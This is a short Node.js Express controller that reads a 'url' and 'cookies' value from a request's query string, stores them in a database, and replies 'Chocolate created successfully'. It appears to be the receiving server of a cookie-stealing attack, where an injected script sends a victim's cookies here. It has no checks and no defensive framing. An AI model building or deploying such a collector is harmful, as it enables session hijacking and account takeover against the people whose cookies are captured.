const Cookie = require('../models/cookieModel')

exports.store = async (req, res) => {
    try {
      console.log("new data")
      const url = req.query.url
      const cookies = req.query.cookies

      const newCookie = new Cookie({
        url : url,
        cookies : cookies
      });

      await newCookie.save();
      res.status(201).json({ message: 'Chocolate created successfully'});
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
}